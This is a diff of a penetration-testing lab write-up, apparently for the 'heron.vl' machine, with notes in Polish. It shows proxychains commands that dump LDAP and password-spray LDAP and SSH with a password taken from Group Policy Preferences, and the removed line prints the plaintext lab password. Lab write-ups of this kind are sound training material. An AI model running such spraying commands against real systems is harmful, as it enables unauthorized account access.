@@ -67,7 +67,7 @@ proxychains4 ldapdomaindump -u 'heron.vl\samuel.davies' -p <pass> 10.10.215.53
 DOBRA SIADŁO
 ```
 proxychains4 -q nxc ldap 10.10.215.53 -u full_users_list -p '<pass from gpp>' --continue-on-success
-proxychains4 -q nxc ssh 10.10.215.54 -u full_users_list_and_domain -p 'H3r0n2024#!' --continue-on-success 
+proxychains4 -q nxc ssh 10.10.215.54 -u full_users_list_and_domain -p '<pass from gpp>' --continue-on-success 
 ```
 
 siadło do usera `svc-web-accounting-d` na 10.10.215.53 po smb and user `svc-web-accounting-d` with ssh access on 10.10.215.54.
